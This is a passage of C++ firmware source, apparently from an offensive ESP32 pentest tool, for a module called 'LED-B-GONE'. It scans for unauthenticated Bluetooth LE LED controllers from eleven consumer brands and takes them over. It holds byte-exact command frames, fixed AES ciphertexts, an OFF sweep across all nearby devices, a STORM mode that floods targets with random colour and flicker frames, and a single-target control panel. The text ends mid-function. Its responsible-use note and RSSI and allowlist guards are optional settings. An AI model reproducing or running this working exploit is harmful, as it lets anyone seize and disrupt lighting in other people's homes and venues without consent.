#pragma once
// ============================================================================
//  LED-B-GONE  —  l'equivalent BLE du TV-B-Gone (module V1.5.9)
//  Detecte / eteint (OFF sweep) / chahute (STORM) / pilote (Panel) les
//  controleurs de rubans LED BLE du commerce (5 familles). BLE Bluedroid
//  (meme stack que le reste du firmware, PAS de NimBLE -> 0 mix techno).
//
//  Classe de vuln : CWE-306 (aucune auth/appairage/chiffrement sur ces
//  controleurs). USAGE RESPONSABLE : materiel possede ou autorise seulement.
//  Garde-fous embarques : seuil RSSI (proches uniquement) + scope allowlist.
//
//  ZERO RAM au boot : BLEDevice::init seulement a l'entree du menu, deinit a
//  la sortie. Table des familles en flash (const). Cibles en vector local.
//  Protocoles byte-exact : docs/LED-B-GONE.txt  (ble-nrf-recon).
// ============================================================================

#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEClient.h>
#include <BLEUtils.h>
#include <BLEAdvertisedDevice.h>
#include <WiFi.h>
#include <SD.h>
#include <vector>
#include <map>

// --- fournis par le .ino (meme TU, decl defensives) ---
bool kp(uint8_t);
bool kpAny();
void cardUpdate();
void handleDnsRequestSerial();
String promptInput(const char*);
bool confirmPopup(String);
void waitAndReturnToMenu(String);
void enterDebounce();
void backDebounce();
void keyRelease();

namespace ledbg {

// ---------------------------------------------------------------------------
//  Etat / reglages (statiques mais nuls au boot : ints + bool, 0 alloc)
// ---------------------------------------------------------------------------
static int  g_rssiMin  = -70;    // n'attaquer que les cibles proches (mur de securite)
static bool g_scopeOn  = false;  // si true : seulement les MAC de /evil/ble/ledbgone_scope.txt

enum Fam { FAM_NONE = 0, FAM_ELK, FAM_TRIONES, FAM_ZENGGE, FAM_SP110E, FAM_GOVEE,
           FAM_IDEAL, FAM_HILITE, FAM_BJLED, FAM_A0CRC, FAM_PLAYBULB, FAM_YEELIGHT, FAM_COUNT };
static const char* FAM_LBL[FAM_COUNT] = { "-","ELK","Triones","Zengge","SP110E","Govee",
           "iDeal","HiLite","BJ_LED","A0crc","Playbulb","Yeelight" };
// couleur de la pastille par famille (RGB565)
static const uint16_t FAM_COL[FAM_COUNT] = { 0x8410,0x07FF,0xFD20,0x07E0,0xFFE0,0x061F,
           0xF81F,0xFBE0,0xAFE5,0x867F,0xFDA0,0xF800 };
static bool g_famEnabled[FAM_COUNT] = { false,true,true,true,true,true,true,true,true,true,true,true };

struct Target {
  BLEAdvertisedDevice dev;   // copie pour reconnexion
  Fam     fam;
  String  name;
  String  addr;
  int     rssi;
};

// ---------------------------------------------------------------------------
//  Petit echo serie (lisible/pilotable par agent, facon [BCMON] de bitchat)
// ---------------------------------------------------------------------------
static inline void lg(const String& s) { Serial.println("[LEDBG] " + s); }

// ---------------------------------------------------------------------------
//  Palette & helpers UI (M5GFX)
// ---------------------------------------------------------------------------
#define LB_BG    menuBackgroundColor
#define LB_HEAD  0x480F      // violet barre de titre
#define LB_WHITE 0xFFFF
#define LB_GREY  0x8C71
#define LB_OK    0x07E0
#define LB_WARN  0xFFE0
#define LB_BAD   0xF922
#define LB_ACC   0x07FF
static uint8_t lb_spin = 0;
static inline char lbSpin() { static const char s[] = "|/-\\"; return s[lb_spin & 3]; }
static void lbHeader(const char* title, const char* right = nullptr) {
  auto& d = M5.Display; int W = d.width();
  d.fillRect(0, 0, W, 16, LB_HEAD);
  d.setTextSize(1); d.setTextColor(LB_WHITE, LB_HEAD);
  d.setCursor(5, 4); d.print(title);
  if (right) { int tw = d.textWidth(right); d.setCursor(W - tw - 5, 4); d.print(right); }
}
static void lbFooter(const char* t) {
  auto& d = M5.Display; int W = d.width(), H = d.height();
  d.fillRect(0, H - 12, W, 12, LB_HEAD);
  d.setTextSize(1); d.setTextColor(LB_WHITE, LB_HEAD);
  d.setCursor(4, H - 10); d.print(t);
}
static void lbChip(int x, int y, const char* txt, uint16_t col) {
  auto& d = M5.Display; d.setTextSize(1); int tw = d.textWidth(txt);
  d.drawRoundRect(x, y, tw + 6, 11, 2, col); d.setTextColor(col, LB_BG);
  d.setCursor(x + 3, y + 2); d.print(txt);
}
static void lbBars(int x, int y, int rssi) {         // 4 barres de signal
  auto& d = M5.Display; int bars = rssi >= -50 ? 4 : rssi >= -62 ? 3 : rssi >= -72 ? 2 : rssi >= -85 ? 1 : 0;
  for (int i = 0; i < 4; i++) { int bh = 2 + i * 2; d.fillRect(x + i * 4, y + 9 - bh, 3, bh, i < bars ? LB_OK : LB_GREY); }
}
static void lbBar(int x, int y, int w, int h, float fr, uint16_t col) {
  auto& d = M5.Display; if (fr < 0) fr = 0; if (fr > 1) fr = 1;
  d.drawRoundRect(x, y, w, h, 2, LB_GREY); int fw = (int)((w - 4) * fr);
  if (fw > 0) d.fillRoundRect(x + 2, y + 2, fw, h - 4, 1, col);
}

// ---------------------------------------------------------------------------
//  UI au theme Evil (menu*Color, PAS de barre verte custom)
// ---------------------------------------------------------------------------
static bool attackable(const Target& t);   // defini plus bas (scope/rssi/fam)
static void drawTargets(const std::vector<Target>& t, int sel, const char* foot) {
  auto& d = M5.Display; d.clear(LB_BG); int W = d.width();
  char hr[20]; snprintf(hr, sizeof hr, "%d%s", (int)t.size(), g_scopeOn ? " SCOPE" : "");
  lbHeader("LED-B-GONE", hr);
  if (t.empty()) {
    d.setTextSize(1.5); d.setTextColor(LB_GREY, LB_BG); d.setCursor(8, 50); d.print("no LED target");
    d.setTextSize(1); d.setCursor(8, 74); d.print("press 'r' to rescan");
    lbFooter(foot); d.display(); return;
  }
  const int top = 20, lh = 17, maxRows = (d.height() - top - 14) / lh;
  int first = 0;
  if ((int)t.size() > maxRows) { first = sel - maxRows / 2; if (first < 0) first = 0;
    if (first > (int)t.size() - maxRows) first = t.size() - maxRows; }
  for (int i = 0; i < maxRows && first + i < (int)t.size(); i++) {
    int idx = first + i, y = top + i * lh;
    const Target& x = t[idx];
    bool on = (idx == sel), live = attackable(x);
    if (on) d.fillRoundRect(1, y - 1, W - 2, lh - 1, 3, menuSelectedBackgroundColor);
    d.setTextSize(1.5); d.setTextColor(on ? LB_WHITE : (live ? menuTextUnFocusedColor : LB_GREY),
                                       on ? menuSelectedBackgroundColor : LB_BG);
    d.setCursor(5, y + 2); d.printf("%-11.11s", x.name.c_str());
    lbChip(128, y + 1, FAM_LBL[x.fam], FAM_COL[x.fam]);     // pastille famille coloree
    lbBars(W - 20, y + 3, x.rssi);
  }
  lbFooter(foot); d.display();
}

static void banner(const char* l1, const char* l2 = nullptr, uint16_t col = LB_ACC) {
  auto& d = M5.Display; d.clear(LB_BG); lbHeader("LED-B-GONE");
  d.setTextSize(1.5); d.setTextColor(col, LB_BG);
  d.setCursor(8, 44); d.println(l1);
  if (l2) { d.setTextColor(LB_GREY, LB_BG); d.setTextSize(1); d.setCursor(8, 72); d.println(l2); }
  d.display();
}

// ---------------------------------------------------------------------------
//  Detection de famille : prefixe de nom + service UUID annonce
// ---------------------------------------------------------------------------
static bool pfx(const std::string& n, const char* p) {
  size_t l = strlen(p); return n.size() >= l && memcmp(n.c_str(), p, l) == 0;
}
static Fam detect(BLEAdvertisedDevice& d) {
  std::string n = d.getName();
  auto has = [&](uint16_t u) { return d.haveServiceUUID() && d.isAdvertisingService(BLEUUID(u)); };
  // --- detection par NOM d'abord (prioritaire : plusieurs familles partagent 0xFFF0) ---
  if (pfx(n, "ISP-") || pfx(n, "IDEAL") || pfx(n, "ideal"))              return FAM_IDEAL;
  if (pfx(n, "Yeelight Blue"))                                          return FAM_YEELIGHT;
  if (pfx(n, "BJ_LED"))                                                 return FAM_BJLED;
  if (pfx(n, "PLAYBULB") || pfx(n, "MIPOW"))                            return FAM_PLAYBULB;
  if (pfx(n, "L7161") || pfx(n, "HiLight"))                             return FAM_HILITE;
  if (pfx(n, "ELK-BLE") || pfx(n, "MELK-") || pfx(n, "LEDBLE") || pfx(n, "XROCKER")
      || pfx(n, "ELK-BLEDDM") || pfx(n, "LotusLant") || pfx(n, "Lotus")
      || pfx(n, "LED-DEMO"))                                            return FAM_ELK;
  if (pfx(n, "Triones") || pfx(n, "Dream") || pfx(n, "BRGlight") || pfx(n, "QHM-")) return FAM_TRIONES;
  if (pfx(n, "LEDnetWF") || pfx(n, "IOTBT") || pfx(n, "SURPLIFE"))      return FAM_ZENGGE;
  if (pfx(n, "SP110E") || pfx(n, "SP107E") || pfx(n, "SP105E"))         return FAM_SP110E;
  if (pfx(n, "ihoment_H6") || pfx(n, "Govee_H6") || pfx(n, "GBK_H6"))   return FAM_GOVEE;
  // --- repli par SERVICE UUID annonce (nom absent/inconnu) ---
  if (has(0xFF02))  return FAM_PLAYBULB;
  if (has(0xE031))  return FAM_A0CRC;
  if (has(0xFFD5))  return FAM_TRIONES;
  if (has(0xFFE0))  return FAM_SP110E;
  if (has(0xFFF0))  return FAM_ELK;     // partage par ELK/iDeal/Yeelight -> ELK par defaut
  return FAM_NONE;
}

// ---------------------------------------------------------------------------
//  UUID de la caracteristique d'ecriture selon la famille/cible
// ---------------------------------------------------------------------------
static BLEUUID writeUuidFor(const Target& t) {
  switch (t.fam) {
    case FAM_ELK:    // LEDBLE/XROCKER ecrivent sur FFE1, ELK/MELK sur FFF3
      if (t.name.startsWith("LEDBLE") || t.name.startsWith("XROCKER")) return BLEUUID((uint16_t)0xFFE1);
      return BLEUUID((uint16_t)0xFFF3);
    case FAM_TRIONES: return BLEUUID((uint16_t)0xFFD9);
    case FAM_ZENGGE:  return BLEUUID((uint16_t)0xFF01);
    case FAM_SP110E:  return BLEUUID((uint16_t)0xFFE1);
    case FAM_GOVEE:   return BLEUUID("00010203-0405-0607-0809-0a0b0c0d2b11");
    case FAM_IDEAL:   return BLEUUID("d44bc439-abfd-45a2-b575-925416129600");
    case FAM_HILITE:  return BLEUUID("6e400002-b5a3-f393-e0a9-e50e24dcca9e");
    case FAM_BJLED:   return BLEUUID("0000ee01-0000-1000-8000-00805f9b34fb");
    case FAM_PLAYBULB:return BLEUUID((uint16_t)0xFFFC);
    case FAM_A0CRC:   return BLEUUID((uint16_t)0xA031);
    case FAM_YEELIGHT:return BLEUUID((uint16_t)0xFFF1);
    default:          return BLEUUID((uint16_t)0x0000);
  }
}

// Cherche une caracteristique par UUID dans TOUS les services (gere les UUID de
// service variables, ex. Zengge). Robuste : parcourt les char decouvertes.
static BLERemoteCharacteristic* findChar(BLEClient* cli, BLEUUID cu) {
  std::map<std::string, BLERemoteService*>* svcs = cli->getServices();
  if (!svcs) return nullptr;
  for (auto& kv : *svcs) {
    std::map<std::string, BLERemoteCharacteristic*>* chs = kv.second->getCharacteristics();
    if (!chs) continue;
    for (auto& cc : *chs) if (cc.second->getUUID().equals(cu)) return cc.second;
  }
  return nullptr;
}

// ---------------------------------------------------------------------------
//  Encodeurs de trames (byte-exact, cf. docs/LED-B-GONE.txt §4)
// ---------------------------------------------------------------------------
static uint8_t goveeXor(const uint8_t* p) { uint8_t x = 0; for (int i = 0; i < 19; i++) x ^= p[i]; return x; }
static uint16_t crc16modbus(const uint8_t* p, int n) {      // CRC16/MODBUS (poly 0xA001), emis little-endian
  uint16_t c = 0xFFFF;
  for (int i = 0; i < n; i++) { c ^= p[i]; for (int b = 0; b < 8; b++) c = (c & 1) ? (c >> 1) ^ 0xA001 : (c >> 1); }
  return c;
}
// ciphertexts constants iDealLED (AES-ECB cle fixe, pas de nonce) -> OFF/ON invariables
static const uint8_t IDEAL_OFF[16] = {0x79,0xD1,0xDB,0xA4,0x09,0x19,0xC2,0x46,0xA8,0x58,0x0A,0xE7,0xD1,0x1B,0x78,0x84};
static const uint8_t IDEAL_ON [16] = {0x84,0xDD,0x50,0x42,0x37,0x41,0x50,0x89,0x7A,0xC8,0x2F,0x39,0x11,0x09,0x68,0xA8};

// Couleur -> buffer, renvoie la longueur. Utilise par Panel + STORM.
static int encColor(Fam f, uint8_t* b, uint8_t r, uint8_t g, uint8_t bl) {
  switch (f) {
    case FAM_ELK:     { uint8_t t[] = {0x7E,0x00,0x05,0x03,r,g,bl,0x00,0xEF}; memcpy(b,t,9); return 9; }
    case FAM_TRIONES: { uint8_t t[] = {0x56,r,g,bl,0x00,0xF0,0xAA};          memcpy(b,t,7); return 7; }
    case FAM_SP110E:  { uint8_t t[] = {r,g,bl,0x1E};                          memcpy(b,t,4); return 4; }
    case FAM_GOVEE:   { memset(b,0,20); b[0]=0x33; b[1]=0x05; b[2]=0x02; b[3]=r; b[4]=g; b[5]=bl;
                        b[19]=goveeXor(b); return 20; }
    case FAM_ZENGGE:  { uint8_t t[] = {0x00,0x05,0x80,0x00,0x00,0x05,0xE2,0x0B,r,g,bl}; memcpy(b,t,11); return 11; }
    case FAM_HILITE:  { uint8_t t[] = {0x55,0x07,0x01,r,g,bl};        memcpy(b,t,6); return 6; }
    case FAM_BJLED:   { uint8_t t[] = {0x69,0x96,0x05,0x02,r,g,bl};   memcpy(b,t,7); return 7; }
    case FAM_PLAYBULB:{ uint8_t t[] = {0x00,r,g,bl};                  memcpy(b,t,4); return 4; } // WWRRGGBB
    case FAM_A0CRC:   { uint8_t t[] = {0xA0,0x15,0x06,r,g,bl,0,0};
                        uint16_t c = crc16modbus(t,6); t[6]=c&0xFF; t[7]=(c>>8)&0xFF; memcpy(b,t,8); return 8; }
    case FAM_IDEAL:   { memcpy(b, IDEAL_ON, 16); return 16; }         // couleur AES couteuse -> ON fixe
    case FAM_YEELIGHT:{ char s[20]; int k = snprintf(s,sizeof s,"%u,%u,%u,100",r,g,bl);
                        while (k < 18) s[k++] = ','; memcpy(b,s,18); return 18; }
    default: return 0;
  }
}
static int encBright(Fam f, uint8_t* b, uint8_t v) {
  switch (f) {
    case FAM_ELK:     { uint8_t t[] = {0x7E,0x00,0x01,v,0x00,0x00,0x00,0x00,0xEF}; memcpy(b,t,9); return 9; }
    case FAM_SP110E:  { uint8_t t[] = {v,0xED,0x29,0x2A};                          memcpy(b,t,4); return 4; }
    case FAM_GOVEE:   { memset(b,0,20); b[0]=0x33; b[1]=0x04; b[2]=v; b[19]=goveeXor(b); return 20; }
    case FAM_HILITE:  { uint8_t t[] = {0x55,0x03,0x01,v,0x02};                      memcpy(b,t,5); return 5; }
    default: return encColor(f, b, v, v, v); // fallback : gris = pseudo-luminosite
  }
}

// ---------------------------------------------------------------------------
//  Connexion robuste (reutilise UN client -> pas de fuite GATT sur un sweep)
// ---------------------------------------------------------------------------
static bool doConnect(BLEClient* cli, Target& t) {
  for (int a = 0; a < 4; a++) {
    if (cli->isConnected()) cli->disconnect();
    if (cli->connect(&t.dev)) return true;
    for (int w = 0; w < 6; w++) { cardUpdate(); delay(50); }  // ~300ms, reste pilotable
  }
  return false;
}

// Envoie la sequence OFF de la famille (init + variantes clones). true si ecrit.
static bool familyOff(BLEClient* cli, Target& t) {
  for (int w = 0; w < 3; w++) { cardUpdate(); delay(50); }  // ~150ms resolution services
  if (t.fam == FAM_SP110E) {
    BLERemoteCharacteristic* e2 = findChar(cli, BLEUUID((uint16_t)0xFFE2));
    BLERemoteCharacteristic* e1 = findChar(cli, BLEUUID((uint16_t)0xFFE1));
    if (e2) { uint8_t i0[] = {0x01,0x00};               e2->writeValue(i0, 2, false); delay(60); }
    if (!e1) return false;
    uint8_t i1[] = {0x01,0xB7,0xE3,0xD5};               e1->writeValue(i1, 4, false); delay(60);
    uint8_t o1[] = {0xB0,0x4F,0xC2,0xAB};               e1->writeValue(o1, 4, false); delay(80);
    uint8_t o2[] = {0x00,0x00,0x00,0xAB};               e1->writeValue(o2, 4, false);
    return true;
  }
  BLERemoteCharacteristic* ch = findChar(cli, writeUuidFor(t));
  if (!ch) return false;
  switch (t.fam) {
    case FAM_ELK: {
      uint8_t v0[] = {0x7E,0x00,0x04,0x00,0x00,0x00,0xFF,0x00,0xEF}; ch->writeValue(v0,9,false); delay(90);
      uint8_t v1[] = {0x7E,0x07,0x04,0x00,0x00,0x00,0x02,0x01,0xEF}; ch->writeValue(v1,9,false); delay(90);
      uint8_t v2[] = {0x7E,0x04,0x04,0x00,0x00,0x00,0xFF,0x00,0xEF}; ch->writeValue(v2,9,false); delay(90);
      if (t.name.startsWith("XROCKER")) { uint8_t xr[] = {0x7B,0xFF,0x04,0x00,0xFF,0xFF,0xFF,0xFF,0xBF}; ch->writeValue(xr,9,false); }
      return true; }
    case FAM_TRIONES: {
      uint8_t off[] = {0xCC,0x24,0x33}; ch->writeValue(off,3,false); return true; }
    case FAM_ZENGGE: {
      // best-effort (firmwares divergents) : enveloppe + payload power-off 71 24 0F A4, puis payload nu.
      uint8_t env[] = {0x00,0x04,0x80,0x00,0x00,0x04,0x71,0x24,0x0F,0xA4}; ch->writeValue(env,10,false); delay(90);
      uint8_t raw[] = {0x71,0x24,0x0F,0xA4};                              ch->writeValue(raw,4,false);  return true; }
    case FAM_GOVEE: {
      uint8_t p[20]; memset(p,0,20); p[0]=0x33; p[1]=0x01; p[2]=0x00; p[19]=goveeXor(p);
      ch->writeValue(p,20,false); delay(90);
      uint8_t b[20]; memset(b,0,20); b[0]=0x33; b[1]=0x04; b[2]=0x14; b[19]=goveeXor(b); // lum ~0 = eteint
      ch->writeValue(b,20,false); return true; }
    case FAM_IDEAL: {                                   // AES-ECB cle fixe -> ciphertext OFF constant
      ch->writeValue((uint8_t*)IDEAL_OFF, 16, false); return true; }
    case FAM_HILITE: {
      uint8_t off[] = {0x55,0x01,0x02,0x00}; ch->writeValue(off,4,false); return true; }
    case FAM_BJLED: {
      uint8_t off[] = {0x69,0x96,0x02,0x01,0x00}; ch->writeValue(off,5,false); return true; }
    case FAM_A0CRC: {                                   // A0 11 04 00 + CRC16-MODBUS LE
      uint8_t off[] = {0xA0,0x11,0x04,0x00,0x70,0xE1}; ch->writeValue(off,6,false); return true; }
    case FAM_PLAYBULB: {                                // char 0xFFFC WWRRGGBB=0 -> eteint
      uint8_t off[] = {0x00,0x00,0x00,0x00}; ch->writeValue(off,4,false); return true; }
    case FAM_YEELIGHT: {                                // char 0xFFF1 payload ASCII, luminosite 0 (best-effort)
      uint8_t off[18]; memset(off, ',', 18); off[3] = '0'; ch->writeValue(off,18,false); return true; }
    default: return false;
  }
}

// Une trame "chaos" aleatoire (couleur random). Renvoie la longueur.
static int encStorm(Fam f, uint8_t* b) {
  uint8_t r = esp_random(), g = esp_random(), bl = esp_random();
  if (f == FAM_IDEAL) {                                      // couleur AES couteuse -> flicker OFF/ON
    memcpy(b, (esp_random() & 1) ? IDEAL_ON : IDEAL_OFF, 16); return 16;
  }
  if (f == FAM_TRIONES && (esp_random() & 1)) {              // alterne mode/effet vitesse max
    uint8_t mm = 0x25 + (esp_random() % 0x14), ss = 0x01;
    uint8_t t[] = {0xBB, mm, ss, 0x44}; memcpy(b, t, 4); return 4;
  }
  return encColor(f, b, r, g, bl);                           // Govee : XOR deja recalcule dans encColor
}

// ---------------------------------------------------------------------------
//  Scope allowlist (SD : /evil/ble/ledbgone_scope.txt, une MAC par ligne)
// ---------------------------------------------------------------------------
static bool inScope(const String& addr) {
  if (!g_scopeOn) return true;
  File f = SD.open("/evil/ble/ledbgone_scope.txt", FILE_READ);
  if (!f) return false;                                      // scope ON mais pas de liste = rien
  String want = addr; want.toUpperCase();
  bool ok = false;
  while (f.available()) {
    String l = f.readStringUntil('\n'); l.trim(); l.toUpperCase();
    if (l.length() && want.indexOf(l) >= 0) { ok = true; break; }
  }
  f.close();
  return ok;
}
static bool attackable(const Target& t) {
  return g_famEnabled[t.fam] && t.rssi >= g_rssiMin && inScope(t.addr);
}

// ---------------------------------------------------------------------------
//  Scan -> liste de cibles LED
// ---------------------------------------------------------------------------
static void scanTargets(std::vector<Target>& out) {
  banner("Scan BLE...", "familles LED (5s)", menuTextFocusedColor);
  lg("scan start");
  out.clear();
  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  scan->setInterval(45); scan->setWindow(30);
  BLEScanResults res = scan->start(5, false);
  for (int i = 0; i < res.getCount(); i++) {
    BLEAdvertisedDevice dv = res.getDevice(i);
    Fam f = detect(dv);
    if (f == FAM_NONE) continue;
    Target t; t.dev = dv; t.fam = f;
    t.name = dv.getName().empty() ? String("(") + FAM_LBL[f] + ")" : String(dv.getName().c_str());
    t.addr = String(dv.getAddress().toString().c_str());
    t.rssi = dv.getRSSI();
    out.push_back(t);
    lg(String("found ") + t.name + " [" + FAM_LBL[f] + "] " + t.addr + " " + t.rssi + "dBm"
       + (attackable(t) ? "" : " (hors-scope/faible)"));
  }
  scan->clearResults();
  lg(String("scan done, ") + (int)out.size() + " LED target(s)");
}

// ---------------------------------------------------------------------------
//  MODE OFF  (sweep sequentiel)
// ---------------------------------------------------------------------------
static void sweepOff(std::vector<Target>& t, BLEClient* cli) {
  int ok = 0, ko = 0, skip = 0, N = t.size();
  lg(String("OFF sweep start, ") + N + " target(s)");
  for (int i = 0; i < N; i++) {
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); lg("OFF sweep aborted"); break; }
    auto& d = M5.Display; d.clear(LB_BG); int W = d.width();
    char hr[16]; snprintf(hr, sizeof hr, "%d/%d", i + 1, N);
    lbHeader("OFF SWEEP", hr);
    lbBar(8, 24, W - 16, 12, (float)(i + 1) / (float)N, LB_ACC);
    d.setTextSize(1.5); d.setTextColor(LB_WHITE, LB_BG); d.setCursor(8, 46);
    d.printf("%-12.12s", t[i].name.c_str());
    lbChip(8, 66, FAM_LBL[t[i].fam], FAM_COL[t[i].fam]);
    d.setTextSize(1.5);
    d.setTextColor(LB_OK, LB_BG);   d.setCursor(8, 86);  d.printf("OK %d", ok);
    d.setTextColor(LB_BAD, LB_BG);  d.setCursor(70, 86); d.printf("KO %d", ko);
    d.setTextColor(LB_GREY, LB_BG); d.setCursor(140, 86); d.printf("skip %d", skip);
    lbFooter("DEL = stop");
    d.display();
    if (!attackable(t[i])) { skip++; lg(String("skip ") + t[i].name + " (scope/rssi/fam)"); continue; }
    if (!doConnect(cli, t[i])) { ko++; lg(String("KO connect ") + t[i].name); continue; }
    bool wrote = familyOff(cli, t[i]);
    cli->disconnect();
    if (wrote) { ok++; lg(String("OFF sent -> ") + t[i].name); }
    else       { ko++; lg(String("KO char   -> ") + t[i].name); }
    for (int w = 0; w < 4; w++) { cardUpdate(); delay(50); }
  }
  banner("OFF sweep fini", (String("OK ") + ok + "  KO " + ko + "  skip " + skip).c_str(), menuTextFocusedColor);
  lg(String("OFF sweep done OK=") + ok + " KO=" + ko + " skip=" + skip);
  for (int w = 0; w < 24; w++) { cardUpdate(); delay(50); if (kpAny()) break; }
}

// ---------------------------------------------------------------------------
//  MODE STORM  (chaos : rafale de trames sur toutes les cibles, round-robin)
// ---------------------------------------------------------------------------
static void stormZone(std::vector<Target>& t, BLEClient* cli) {
  lg("STORM start (DEL=stop)");
  uint32_t frames = 0; int cur = 0, N = t.size();
  // pre-filtre : seulement attaquables
  std::vector<int> idx; for (int i = 0; i < N; i++) if (attackable(t[i])) idx.push_back(i);
  if (idx.empty()) { banner("STORM", "aucune cible dans le scope", TFT_RED);
                     for (int w = 0; w < 20; w++) { cardUpdate(); delay(50); if (kpAny()) break; } return; }
  while (true) {
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); break; }
    Target& x = t[idx[cur % idx.size()]];
    if (doConnect(cli, x)) {
      for (int w = 0; w < 3; w++) { cardUpdate(); delay(50); }
      BLERemoteCharacteristic* ch;
      if (x.fam == FAM_SP110E) {                 // SP110E : init obligatoire avant toute commande
        BLERemoteCharacteristic* e2 = findChar(cli, BLEUUID((uint16_t)0xFFE2));
        if (e2) { uint8_t i0[] = {0x01,0x00}; e2->writeValue(i0, 2, false); delay(50); }
        ch = findChar(cli, BLEUUID((uint16_t)0xFFE1));
        if (ch) { uint8_t i1[] = {0x01,0xB7,0xE3,0xD5}; ch->writeValue(i1, 4, false); delay(50); }
      } else {
        ch = findChar(cli, writeUuidFor(x));
      }
      if (ch) {
        for (int k = 0; k < 6 && !(kp(KEY_BACKSPACE) || kp('`')); k++) {
          uint8_t buf[24]; int n = encStorm(x.fam, buf);
          if (n) { ch->writeValue(buf, n, false); frames++; }
          auto& d = M5.Display; d.clear(LB_BG);
          char hr[8]; snprintf(hr, sizeof hr, "%c", lbSpin()); lb_spin++;
          lbHeader("STORM", hr);
          d.setTextSize(2); d.setTextColor(FAM_COL[x.fam], LB_BG); d.setCursor(8, 34);
          d.printf("%-9.9s", x.name.c_str());
          lbChip(8, 60, FAM_LBL[x.fam], FAM_COL[x.fam]);
          d.setTextSize(1.5); d.setTextColor(LB_WHITE, LB_BG); d.setCursor(8, 82);
          d.printf("frames: %u", frames);
          lbFooter("DEL = stop");
          d.display();
          for (int w = 0; w < 2; w++) { cardUpdate(); delay(40); }  // ~80ms -> rate-limit
        }
      }
      cli->disconnect();
    }
    cur++;
    if (idx.size() == 1) { for (int w = 0; w < 2; w++) { cardUpdate(); delay(40); } } // 1 cible : rester dessus
  }
  banner("STORM fini", (String(frames) + " trames").c_str(), menuTextFocusedColor);
  lg(String("STORM done frames=") + frames);
  for (int w = 0; w < 16; w++) { cardUpdate(); delay(50); if (kpAny()) break; }
}

// ---------------------------------------------------------------------------
//  PANEL CIBLE  (controle fin d'une cible : ON/OFF/couleur/lum/squat)
// ---------------------------------------------------------------------------
static void panel(Target& x, BLEClient* cli) {
  lg(String("panel ") + x.name + " [" + FAM_LBL[x.fam] + "]");
  if (!doConnect(cli, x)) { banner("Panel", "connexion echec", TFT_RED);
    for (int w = 0; w < 16; w++) { cardUpdate(); delay(50); if (kpAny()) break; } return; }
  for (int w = 0; w < 3; w++) { cardUpdate(); delay(50); }
  // SP110E : init obligatoire avant toute commande
  if (x.fam == FAM_SP110E) {
    BLERemoteCharacteristic* e2 = findChar(cli, BLEUUID((uint16_t)0xFFE2));
    BLERemoteCharacteristic* e1 = findChar(cli, BLEUUID((uint16_t)0xFFE1));
    if (e2) { uint8_t i0[] = {0x01,0x00}; e2->writeValue(i0,2,false); delay(50); }
    if (e1) { uint8_t i1[] = {0x01,0xB7,0xE3,0xD5}; e1->writeValue(i1,4,false); delay(50); }
  }
  BLERemoteCharacteristic* ch = findChar(cli, writeUuidFor(x));
  uint8_t hue = 0, bri = 0x80; bool on = true; String last = "pret";
  while (cli->isConnected()) {
    cardUpdate();
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); break; }
    auto send = [&](const char* lab, uint8_t* b, int n) {
      if (ch && n) { ch->writeValue(b, n, false); last = lab; lg(String("panel -> ") + lab); } };
    bool redraw = false;
    if (kp(' ')) {                                   // toggle ON/OFF
      on = !on;
      if (!on) { familyOff(cli, x); last = "OFF"; lg("panel -> OFF"); }
      else     { uint8_t b[24]; int n = encColor(x.fam, b, 0xFF, 0xFF, 0xFF); send("ON(white)", b, n); }
      redraw = true;
    } else if (kp('.')) {                            // teinte +
      hue += 16; uint8_t r, g, bl;
      // roue simple HSV->RGB approx par secteurs
      uint8_t s = hue / 43, f = (hue % 43) * 6;
      switch (s) { case 0: r=255; g=f; bl=0; break; case 1: r=255-f; g=255; bl=0; break;
                   case 2: r=0; g=255; bl=f; break; case 3: r=0; g=255-f; bl=255; break;
                   case 4: r=f; g=0; bl=255; break; default: r=255; g=0; bl=255-f; }
      uint8_t b[24]; int n = encColor(x.fam, b, r, g, bl); send("couleur", b, n); redraw = true;
    } else if (kp(';')) {                            // luminosite +/-
      bri = (bri >= 0xE0) ? 0x20 : bri + 0x20;
      uint8_t b[24]; int n = encBright(x.fam, b, bri); send("lum", b, n); redraw = true;
    } else if (kp('k')) { last = "squat (connexion gardee)"; lg("panel squat"); redraw = true; }
    if (redraw) {
      auto& d = M5.Display; d.clear(LB_BG); int W = d.width();
      lbHeader("PANEL", ch ? "char OK" : "char KO");
      d.setTextSize(1.5); d.setTextColor(LB_WHITE, LB_BG);
      d.setCursor(8, 22); d.printf("%-13.13s", x.name.c_str());
      lbChip(8, 44, FAM_LBL[x.fam], FAM_COL[x.fam]);
      // pastille de couleur courante (approx depuis hue)
      { uint8_t s = hue / 43, f = (hue % 43) * 6, r, g, bl;
        switch (s) { case 0: r=255; g=f; bl=0; break; case 1: r=255-f; g=255; bl=0; break;
                     case 2: r=0; g=255; bl=f; break; case 3: r=0; g=255-f; bl=255; break;
                     case 4: r=f; g=0; bl=255; break; default: r=255; g=0; bl=255-f; }
        uint16_t c = on ? d.color565(r, g, bl) : LB_GREY;
        d.fillRoundRect(W - 34, 42, 26, 14, 3, c); d.drawRoundRect(W - 34, 42, 26, 14, 3, LB_WHITE); }
      d.setTextSize(1.5); d.setTextColor(on ? LB_OK : LB_BAD, LB_BG);
      d.setCursor(8, 66); d.printf("state: %s", last.c_str());
      d.setTextColor(LB_GREY, LB_BG); d.setTextSize(1);
      d.setCursor(8, 92);  d.print("SPACE on/off   . color   ; bright");
      lbFooter("k = squat (hold link)   DEL = back");
      d.display();
      keyRelease();   // debounce : une action par appui (pas de machine-gun en maintenant la touche)
    }
    delay(40);
  }
  cli->disconnect();
  lg("panel exit");
}

// ---------------------------------------------------------------------------
//  SETTINGS  (scope / seuil RSSI / familles)  -- via loopOptions-like maison
// ---------------------------------------------------------------------------
static void settings() {
  const int NROWS = 2 + (FAM_COUNT - 1);   // scope + rssi + familles (FAM_ELK..dernier)
  int sel = 0, top = 0, lastSel = -1, lastTop = -1; bool dirty = true;
  while (true) {
    if (dirty || sel != lastSel) {
      auto& d = M5.Display; d.clear(LB_BG); int W = d.width();
      lbHeader("LED-B-GONE", "config");
      const int y0 = 20, lh = 16, rows = (d.height() - y0 - 14) / lh;
      if (sel < top) top = sel; if (sel >= top + rows) top = sel - rows + 1;
      for (int r = 0; r < rows && top + r < NROWS; r++) {
        int i = top + r, y = y0 + r * lh; bool on = (i == sel);
